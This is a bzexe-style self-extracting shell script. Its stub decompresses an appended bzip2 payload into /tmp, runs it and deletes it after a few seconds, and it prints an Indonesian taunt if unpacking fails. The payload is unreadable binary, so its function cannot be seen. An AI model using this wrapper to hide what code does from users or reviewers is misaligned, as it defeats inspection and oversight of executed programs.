#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY��&  F߀ }���aA
���@��� j#iOAh�&F������    h4���O)��� ������)�F�B��MSM��4�=��f�{¸+u���^�ȡ[bC��m�#�ƙ�kS9��5���K�͊��[K��[Ûp����{B���� 9�͘[{��Y��25�5 �"` �h+!i���l��b8�c�d��BR�ژ�A`�� �gR)
�p�Q�ų^�M�}v� 2G0>2�
yѦaȾT�Z�G��R��q�pO�����+`U}PEa��q�v��\z<9� �! �Cb�����ST�H�W�aEL���$LU�KQ��`I�Rfc織;U�!�L1�ޞ¢�M�.<`kF��ah�h�BI�	�f��!�q���Q)�qU*O~��1v`����Y�`�\��ǎ+@��!(0s�JE"5�f���[�	9�Gju뻔�$�;��1yAe0�?Qw$S�	A��`